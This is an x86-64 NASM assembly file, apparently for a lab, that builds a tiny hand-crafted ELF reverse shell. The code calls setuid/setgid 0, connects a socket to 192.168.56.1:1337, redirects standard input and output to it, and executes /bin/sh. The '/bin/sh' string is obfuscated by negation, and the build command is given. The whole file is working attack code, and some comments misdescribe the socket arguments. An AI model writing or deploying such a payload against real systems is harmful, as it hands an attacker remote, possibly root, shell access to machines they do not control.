; Minimal ELF that:
; setuid(0)
; setgid(0)
; s = socket(AF_INET, SOCK_STREAM, 0)
; connect(s, sockaddr_in)
; dup2(s, 0)
; dup2(s, 1)
; dup2(s, 2)
; execve('/bin/sh', ['/bin/sh'], NULL)
;
; INP=revshell; nasm -f bin -o $INP $INP.S
BITS 64
ehdr:                               ; ELF64_Ehdr
    db  0x7F, "ELF", 2, 1, 1, 0     ; e_ident[0..6]
    times 8 db 0                    ; EI_PAD (padding)
    dw  3                           ; e_type = ET_DYN (shared object / PIE)
    dw  0x3e                        ; e_machine = EM_X86_64
    dd  1                           ; e_version = EV_CURRENT
    dq  _start                      ; e_entry (entry point address)
    dq  phdr - $$                   ; e_phoff (program header offset)
    dq  0                           ; e_shoff (no section headers)
    dd  0                           ; e_flags
    dw  ehdrsize                    ; e_ehsize
    dw  phdrsize                    ; e_phentsize
    dw  1                           ; e_phnum = 1 segment
    dw  0                           ; e_shentsize
    dw  0                           ; e_shnum
    dw  0                           ; e_shstrndx

ehdrsize    equ $ - ehdr

phdr:
    dd  1                           ; p_type = PT_LOAD
    dd  5                           ; p_flags = R + X (read, execute)
    dq  0                           ; p_offset = 0 (load entire binary from offset 0)
    dq  $$                          ; p_vaddr = virtual address of this code
    dq  $$                          ; p_paddr = physical address (ignored)
    dq  filesize                    ; p_filesz = total size of the file
    dq  filesize                    ; p_memsz = memory to allocate
    dq  0x1000                      ; p_align = page aligned

phdrsize    equ $ - phdr


_start:
    xor rdi, rdi
    mov al, 0x69
    syscall                         ; setuid(0)
    xor rdi, rdi
    mov al, 0x6a                    
    syscall                         ; setgid(0)
    mov edx, 0                      ; protocol = 0 
    mov esi, 1                      ; SOCK_STREAM   
    mov edi, 2                      ; AF_INET
    mov eax, 0x29                   ; socket syscall
    syscall                         ; socket(AF_INET, SOCK_DGRAM, SOCK_NONBLOCK)
    mov rdi, rax                    ; save socket FD
    xor rax, rax
    push rax                        ; padding (sockaddr_in is 16 bytes)
    mov rax, 0x138a8c039050002      ; 0x0002 = AF_INET, 0x3905 = htons(1337), 0x138a8c0 = inet_addr(192.168.56.1)
    push rax                        
    lea rsi, [rsp]                  ; pointer to sockaddr_in; rdi should be a pointer to the above hex value
    mov rdx, 0x10                   ; sizeof(struct sockaddr_in)
    mov eax, 0x2a                   ; connect syscall
    syscall                         ; connect(socket_fd, sockaddr_in, address_len)
    mov esi, 0                      ; rdi should still be our fd from the socket call
    mov al, 0x21                    ; dup2(socket_fd, 0);
    syscall
    mov esi, 1                      
    mov al, 0x21                    ; dup2(socket_fd, 1);
    syscall
    mov esi, 2                      
    mov al, 0x21                    ; dup2(socket_fd, 2);
    syscall                         ; This makes /bin/sh use the socket for I/O.
    mov rbx, 0xff978cd091969dd1
    neg rbx							; "/bin/sh" (string encoded as negative value)
    push rbx
    mov rdi, rsp                    ; argv[0] = "/bin/sh"
    mov edx, 0                      ; envp = NULL
    mov esi, 0                      ; argv = NULL 
    mov al, 0x3b                    ; execve syscall
    syscall                         ; execve("/bin/sh", 0, 0)

filesize    equ $ - $$
